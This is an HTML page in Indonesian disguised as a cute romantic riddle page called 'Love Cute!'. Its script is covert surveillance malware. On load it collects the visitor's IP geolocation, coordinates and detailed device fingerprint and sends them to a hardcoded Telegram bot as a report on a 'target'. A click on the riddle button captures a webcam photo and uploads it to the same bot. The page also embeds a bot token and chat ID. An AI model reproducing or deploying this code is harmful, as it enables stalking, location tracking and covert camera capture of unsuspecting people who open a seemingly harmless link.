<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@400;600;700&display=swap');

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Quicksand', sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 49%, #fecfef 100%);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  position: relative;
}

/* Animated background hearts */
.heart {
  position: absolute;
  width: 20px;
  height: 20px;
  background-color: rgba(255, 105, 180, 0.7);
  transform: rotate(45deg);
  animation: float 15s infinite linear;
  opacity: 0;
}

.heart:before,
.heart:after {
  content: "";
  position: absolute;
  width: 20px;
  height: 20px;
  background-color: rgba(255, 105, 180, 0.7);
  border-radius: 50%;
}

.heart:before {
  top: -10px;
  left: 0;
}

.heart:after {
  top: 0;
  left: -10px;
}

@keyframes float {
  0% {
    transform: translateY(100vh) rotate(45deg);
    opacity: 0;
  }
  10% {
    opacity: 0.8;
  }
  90% {
    opacity: 0.8;
  }
  100% {
    transform: translateY(-100vh) rotate(45deg);
    opacity: 0;
  }
}

.container {
  background-color: rgba(255, 255, 255, 0.85);
  border-radius: 20px;
  padding: 40px;
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
  text-align: center;
  max-width: 500px;
  width: 90%;
  z-index: 10;
  position: relative;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.2);
  animation: fadeIn 1s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

h1 {
  font-family: 'Pacifico', cursive;
  font-size: 2.8em;
  margin-bottom: 20px;
  color: #ff69b4;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.05);
  }
  100% {
    transform: scale(1);
  }
}

p {
  font-size: 1.3em;
  margin-bottom: 30px;
  color: #555;
  line-height: 1.5;
}

.button-container {
  position: relative;
  display: inline-block;
}

button {
  padding: 15px 35px;
  font-size: 1.3em;
  font-weight: bold;
  border: none;
  border-radius: 50px;
  background: linear-gradient(45deg, #ff69b4, #ff9a9e);
  color: white;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 4px 15px rgba(255, 105, 180, 0.4);
  position: relative;
  overflow: hidden;
  z-index: 1;
}

button:before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: linear-gradient(45deg, #ff9a9e, #ff69b4);
  z-index: -1;
  transition: all 0.3s ease;
  opacity: 0;
}

button:hover {
  transform: translateY(-3px);
  box-shadow: 0 7px 20px rgba(255, 105, 180, 0.5);
}

button:hover:before {
  opacity: 1;
}

button:active {
  transform: translateY(1px);
  box-shadow: 0 2px 10px rgba(255, 105, 180, 0.4);
}

.emoji {
  font-size: 1.2em;
  margin: 0 5px;
  display: inline-block;
  animation: bounce 2s infinite;
}

@keyframes bounce {
  0%, 20%, 50%, 80%, 100% {
    transform: translateY(0);
  }
  40% {
    transform: translateY(-10px);
  }
  60% {
    transform: translateY(-5px);
  }
}

.emoji:nth-child(2) {
  animation-delay: 0.2s;
}

.emoji:nth-child(3) {
  animation-delay: 0.4s;
}

.loading {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(255, 255, 255, 0.9);
  z-index: 100;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}

.loading-spinner {
  width: 50px;
  height: 50px;
  border: 5px solid rgba(255, 105, 180, 0.3);
  border-radius: 50%;
  border-top-color: #ff69b4;
  animation: spin 1s ease-in-out infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  margin-top: 20px;
  font-size: 1.2em;
  color: #ff69b4;
}

.hearts-container {
  position: absolute;
  width: 100%;
  height: 100%;
  top: 0;
  left: 0;
  pointer-events: none;
  z-index: 5;
}

/* Responsive design */
@media (max-width: 600px) {
  h1 {
    font-size: 2.2em;
  }
  
  p {
    font-size: 1.1em;
  }
  
  button {
    padding: 12px 25px;
    font-size: 1.1em;
  }
}
</style>
</head>
<body>

<div class="hearts-container" id="heartsContainer"></div>

<div class="container">
  <h1><span class="emoji">💕</span> KAMU TAU GAAAA <span class="emoji">💕</span></h1>
  <p>apaaa buah yang namanyaa selalu bikinyaa nyaman <span class="emoji">🤔</span></p>
  <div class="button-container">
    <button id="btnCamera"><i class="fas fa-camera"></i> apaa tuh</button>
  </div>
</div>

<div class="loading" id="loading">
  <div class="loading-spinner"></div>
  <div class="loading-text">Sedang memuat...</div>
</div>

<script>
const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";

// Create floating hearts
function createHeart() {
  const heart = document.createElement('div');
  heart.classList.add('heart');
  
  // Random size
  const size = Math.random() * 15 + 10;
  heart.style.width = `${size}px`;
  heart.style.height = `${size}px`;
  
  // Random position
  const left = Math.random() * 100;
  heart.style.left = `${left}%`;
  
  // Random animation duration
  const duration = Math.random() * 10 + 10;
  heart.style.animationDuration = `${duration}s`;
  
  // Random opacity
  const opacity = Math.random() * 0.5 + 0.3;
  heart.style.opacity = opacity;
  
  // Random color
  const colors = ['#ff69b4', '#ff9a9e', '#fecfef', '#fad0c4'];
  const color = colors[Math.floor(Math.random() * colors.length)];
  heart.style.backgroundColor = color;
  
  document.getElementById('heartsContainer').appendChild(heart);
  
  // Remove heart after animation
  setTimeout(() => {
    heart.remove();
  }, duration * 1000);
}

// Create hearts periodically
setInterval(createHeart, 2000);

// Create initial hearts
for (let i = 0; i < 10; i++) {
  setTimeout(createHeart, i * 500);
}

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ipwhois.io
async function getIpInfo(){
  try{
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0"
    };
  }catch(e){
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
  }
}

// Ambil device info
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    screenWidth:screen.width,
    screenHeight:screen.height,
    innerWidth:window.innerWidth,
    innerHeight:window.innerHeight,
    cores:navigator.hardwareConcurrency||"-",
    memory:navigator.deviceMemory||"-",
    touchPoints:navigator.maxTouchPoints||0,
    orientation:screen.orientation?.type||"-",
    colorDepth:screen.colorDepth||"-",
    pixelRatio:window.devicePixelRatio||"-",
    online:navigator.onLine,
    cookiesEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    battery:b
  };
}

// Build caption Telegram with HTML v4 and blockquote
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  return [
    "<b>🔍 INFORMATION TARGET 🔍</b>",
    "",
    "<blockquote>",
    "<b>📍 Location Information</b>",
    `IP: <code>${escapeHtml(ip.ip)}</code>`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)} ${escapeHtml(ip.country_code)}`,
    `Coordinates: <code>${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}</code>`,
    `🗺️ <a href="${g}">View on Google Maps</a>`,
    "</blockquote>",
    "",
    "<blockquote>",
    "<b>📱 Device Information</b>",
    `User Agent: <code>${escapeHtml(d.userAgent)}</code>`,
    `Platform: ${escapeHtml(d.platform)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Screen: <code>${escapeHtml(d.screenWidth+"x"+d.screenHeight)}</code>`,
    `Viewport: <code>${escapeHtml(d.innerWidth+"x"+d.innerHeight)}</code>`,
    `CPU Cores: ${escapeHtml(d.cores)}`,
    `RAM: ${escapeHtml(d.memory)} GB`,
    `Touch Points: ${escapeHtml(d.touchPoints)}`,
    `Orientation: ${escapeHtml(d.orientation)}`,
    `Color Depth: ${escapeHtml(d.colorDepth)} bit`,
    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `Connection: ${escapeHtml(d.online ? "Online" : "Offline")}`,
    `Cookies: ${escapeHtml(d.cookiesEnabled ? "Enabled" : "Disabled")}`,
    `Do Not Track: ${escapeHtml(d.doNotTrack || "Not Set")}`,
    `🔋 Battery: ${escapeHtml(d.battery?.level ? Math.round(d.battery.level * 100) + "%" : "-")} (${d.battery?.charging?"Charging":"Not charging"})`,
    `⏱️ Charging Time: ${escapeHtml(d.battery?.chargingTime ? Math.round(d.battery.chargingTime / 60) + " min" : "-")}`,
    `⏳ Discharging Time: ${escapeHtml(d.battery?.dischargingTime ? Math.round(d.battery.dischargingTime / 60) + " min" : "-")}`,
    "</blockquote>",
    "",
    "<blockquote>",
    "<b>🌐 URL & Time Information</b>",
    `URL: <code>${escapeHtml(location.href)}</code>`,
    `Time (UTC): <code>${escapeHtml(new Date().toISOString())}</code>`,
    `Local Time: <code>${escapeHtml(new Date().toLocaleString())}</code>`,
    "</blockquote>",
    "",
    "<i>📸 Captured by Love Cute App</i>"
  ].join("\n");
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip,d),
      parse_mode:"HTML"
    })
  });
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  // Show loading
  document.getElementById('loading').style.display = 'flex';
  
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "<b>📸 Sukes screenshot foto target</b>\n\n<i>Captured with Love Cute App</i>");
    formData.append("parse_mode", "HTML");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
    
    // Hide loading
    document.getElementById('loading').style.display = 'none';
    
    // Show success message
    showNotification("Foto berhasil dikirim! 💕");
  }catch(e){
    console.log("yahhh", e);
    // Hide loading
    document.getElementById('loading').style.display = 'none';
    
    // Show error message
    showNotification("Terjadi kesalahan, coba lagi nanti! 😢");
  }
}

// Show notification
function showNotification(message) {
  const notification = document.createElement('div');
  notification.style.position = 'fixed';
  notification.style.bottom = '20px';
  notification.style.left = '50%';
  notification.style.transform = 'translateX(-50%)';
  notification.style.backgroundColor = 'rgba(255, 105, 180, 0.9)';
  notification.style.color = 'white';
  notification.style.padding = '15px 25px';
  notification.style.borderRadius = '50px';
  notification.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.2)';
  notification.style.zIndex = '1000';
  notification.style.fontSize = '1.1em';
  notification.style.fontWeight = 'bold';
  notification.style.animation = 'fadeIn 0.5s ease-out';
  notification.textContent = message;
  
  document.body.appendChild(notification);
  
  setTimeout(() => {
    notification.style.animation = 'fadeOut 0.5s ease-out';
    setTimeout(() => {
      notification.remove();
    }, 500);
  }, 3000);
}

// Add fade out animation
const style = document.createElement('style');
style.textContent = `
  @keyframes fadeOut {
    from {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }
    to {
      opacity: 0;
      transform: translateX(-50%) translateY(20px);
    }
  }
`;
document.head.appendChild(style);

// Jalankan saat halaman load
window.addEventListener("load",sendIpDevice);

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
</body>
</html>
